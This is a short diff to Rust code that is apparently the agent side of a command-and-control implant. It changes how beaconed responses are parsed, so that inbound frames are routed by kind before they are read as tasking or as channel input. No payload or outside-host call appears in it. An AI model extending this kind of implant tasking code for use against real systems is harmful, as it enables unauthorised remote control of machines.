@@ -86,18 +86,24 @@ fn beacon_url(enroll_url: &str) -> String {
 }
 
 /// Reads a contact response past its handshake frame: the shared body every
-/// carriage serves. Channel input frames route to the live channel they
-/// name (a task with no live channel is at most a completion race, and is
-/// dropped); a staged task enters its pull cycle; everything else parses as
-/// tasking or the frame is skipped.
+/// carriage serves. Downstream frames are discriminated on kind first, as
+/// the wire contract states -- channel input routes to the live channel it
+/// names (a task with no live channel is at most a completion race, and is
+/// dropped), any other kind-bearing frame (a staged chunk run, say) is not
+/// for this reader, and only kindless frames take the positional
+/// TaskRequest parse; a staged task enters its pull cycle.
 pub fn accept_tasking(session: &mut Session, inbound: &[crate::wire::Frame], acks: bool) {
     use crate::wire::{ChannelInput, TaskRequest};
     use prost::Message;
     for frame in inbound {
-        if frame.kind() == crate::wire::FrameKind::ChannelInput {
+        let kind = frame.kind();
+        if kind == crate::wire::FrameKind::ChannelInput {
             if let Ok(input) = ChannelInput::decode(frame.payload.as_ref()) {
                 session.channels.feed(&input.task_id, input.data, input.eof);
             }
+            continue;
+        }
+        if kind != crate::wire::FrameKind::Unspecified {
             continue;
         }
         if let Ok(task) = TaskRequest::decode(frame.payload.as_ref()) {
